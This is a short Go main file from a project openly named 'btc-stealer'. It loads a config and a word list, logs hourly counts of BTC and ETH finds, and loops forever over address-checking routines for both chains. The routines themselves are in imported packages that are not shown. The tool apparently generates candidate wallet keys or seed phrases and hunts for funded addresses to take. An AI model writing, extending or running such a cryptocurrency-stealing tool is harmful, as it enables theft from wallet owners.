package main

import (
	"encoding/json"
	"fmt"
	"os"
	"time"

	"btc-stealer/btc"
	"btc-stealer/common"
	"btc-stealer/eth"
)

func init() {

	file, err := os.ReadFile("config.json")
	if err != nil {
		panic(err)
	}

	var cfg common.Config
	if err = json.Unmarshal(file, &cfg); err != nil {
		panic(err)
	}

	common.InitConfig(&cfg)
	common.SetWords(cfg.WordsList)

	go func() {
		ticker := time.NewTicker(time.Hour)
		for range ticker.C {
			fmt.Println(time.Now(), "btc:", common.BTCCount(), "eth:", common.ETHCount())
		}
	}()
}

func main() {
	for {
		eth.AddressETHCheck()
		btc.AddressBTCCheck()
	}
}
